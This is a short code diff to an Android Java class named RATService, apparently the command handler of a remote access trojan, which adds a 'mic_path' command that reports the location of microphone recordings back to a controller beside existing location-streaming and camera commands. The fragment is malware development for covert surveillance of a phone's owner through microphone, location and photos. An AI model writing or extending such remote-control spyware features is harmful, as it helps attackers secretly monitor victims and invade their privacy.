@@ -566,7 +566,14 @@ public class RATService extends Service {
             case "location_stream":
                 handleLocationStreamCommand(args);
                 break;
-                
+                case "mic_path":
+    if (micModule != null) {
+        String result = micModule.getRecordingsPath();
+        sendCommand("MIC_PATH|" + result);
+    } else {
+        sendCommand("MIC_PATH|ERROR: Mic module not available");
+    }
+    break;
             // Camera commands - Updated to match working project format
             case "take_photo":
             case "camera":
